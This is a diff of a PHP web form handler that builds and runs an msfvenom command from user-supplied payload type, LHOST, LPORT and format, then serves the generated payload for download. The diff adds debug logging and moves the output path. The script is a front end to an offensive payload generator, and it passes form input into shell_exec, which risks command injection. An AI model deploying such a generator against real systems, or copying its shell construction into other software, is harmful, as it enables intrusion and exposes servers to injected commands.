@@ -1,5 +1,13 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    // Define error log file
+    $error_log_file = "/home/dum1ya/Desktop/payload_debug.log";
+    
+    function log_error($message) {
+        global $error_log_file;
+        file_put_contents($error_log_file, date("Y-m-d H:i:s") . " - " . $message . "\n", FILE_APPEND);
+    }
+
     // Validate and sanitize inputs
     $payload_type = escapeshellarg($_POST['payload-type']);
     $lhost = escapeshellarg($_POST['lhost']);
@@ -13,14 +21,16 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 
     // Validate LHOST and LPORT
     if (!filter_var(trim($_POST['lhost']), FILTER_VALIDATE_IP)) {
+        log_error("Invalid LHOST IP address: " . $_POST['lhost']);
         die("Invalid LHOST IP address.");
     }
     if (!is_numeric($_POST['lport']) || $_POST['lport'] <= 0 || $_POST['lport'] > 65535) {
+        log_error("Invalid LPORT number: " . $_POST['lport']);
         die("Invalid LPORT number.");
     }
 
     // Define output file with absolute path
-    $output_file = "/var/www/html/payload." . escapeshellcmd($_POST['output-format']);
+    $output_file = "/home/dum1ya/Desktop/payload." . escapeshellcmd($_POST['output-format']);
 
     // Construct msfvenom command
     $command = "msfvenom -p $payload_type LHOST=$lhost LPORT=$lport ";
@@ -35,13 +45,20 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     }
     $command .= "-a $architecture --platform $platform -f $output_format -o $output_file";
 
-    // Execute command
-    $output = shell_exec($command);
+    // Log command execution
+    log_error("Executing command: $command");
+
+    // Execute command and capture output
+    $output = shell_exec("$command 2>&1");
+    log_error("Command output: " . $output);
 
     // Verify file creation
-    if (!file_exists($output_file)) {
-        die("Failed to generate the payload. Check server logs.");
+    if (!file_exists($output_file) || !is_readable($output_file)) {
+        log_error("Failed to generate the payload at: $output_file");
+        die("Failed to generate the payload. Check debug log.");
     }
+
+    log_error("Payload generated successfully: $output_file");
 
     // Provide file for download
     header('Content-Type: application/octet-stream');
@@ -51,6 +68,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 
     // Cleanup: Delete file after download
     unlink($output_file);
+    log_error("Payload file deleted after download.");
     exit;
 }
 ?>
